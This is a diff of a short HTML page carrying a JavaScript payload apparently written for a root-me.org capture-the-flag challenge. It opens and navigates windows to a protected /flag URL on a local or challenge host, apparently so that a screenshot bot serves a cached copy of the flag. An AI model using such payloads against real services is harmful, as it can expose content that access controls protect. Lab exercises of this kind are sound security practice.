@@ -1,18 +1,10 @@
 <!doctype html>
-<html>
-<body>
 <script>
-  // 1) Prime cache with a request likely sent without page-level extra headers
-  const w = window.open('about:blank', '_blank');
-  if (w) w.location = 'http://127.0.0.1:5000/flag';
+const TARGET = "http://challenge01.root-me.org:58007/flag";
 
-  // 2) Navigate the screenshot page to same URL so Chromium serves cached response
-  setTimeout(() => {
-    location.href = 'http://127.0.0.1:5000/flag';
-  }, 200);
+const w = window.open(TARGET, "_blank");
+setTimeout(() => { try { w && w.close(); } catch(e){} }, 250);
 
-  // Optional: if timing is tight, keep retrying quickly
-  setTimeout(() => { location.href = 'http://127.0.0.1:5000/flag'; }, 600);
+setTimeout(() => { location.href = TARGET; }, 450);
+setTimeout(() => { location.href = TARGET; }, 900);
 </script>
-</body>
-</html>
